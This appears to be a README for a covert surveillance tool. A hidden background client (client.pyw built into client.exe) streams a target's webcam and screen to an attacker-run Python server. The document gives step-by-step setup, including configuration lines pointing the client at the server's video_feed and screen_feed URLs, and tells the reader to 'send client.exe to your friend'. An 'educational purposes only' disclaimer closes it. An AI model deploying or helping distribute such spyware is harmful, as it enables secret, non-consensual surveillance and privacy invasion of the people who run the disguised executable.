# This script allows you to use the client's camera and screen.

If you build client.pyw, it will run in the background processes.

  

### Tutorial:

1. You need a python server.
2. You need to upload the server.py file and the templates folder to the server
3. Then on line 65 of server.py change the port to your server's port
 Example:
```python
app.run(host='0.0.0.0', port=20015)
```
4. In the 8th line of client.pyw, replace SERVERIP:PORT with ip:port/video_feed of your server.
5. On line 9 of client.pyw, change SERVERIP:PORT to ip:port/screen_feed of your server.
 Example:
```python
remote_server_camera_url = 'http://verycoolIP:20015/video_feed'
remote_server_screen_url = 'http://verycoolIP:20015/screen_feed'
```
6. Start your server and build client.pyw
7. Send client.exe to your friend

### How to close it, 2 ways:
1. In the task manager, close client.exe (or something similar)
2. Restart your computer.

### Some errors:
1. If you don't have a camera, the programme will not work
2. If you have bad internet, the app will not work

That's all, sorry for my bad English.
# AND REMEMBER THIS IS FOR EDUCATIONAL PURPOSES ONLY.
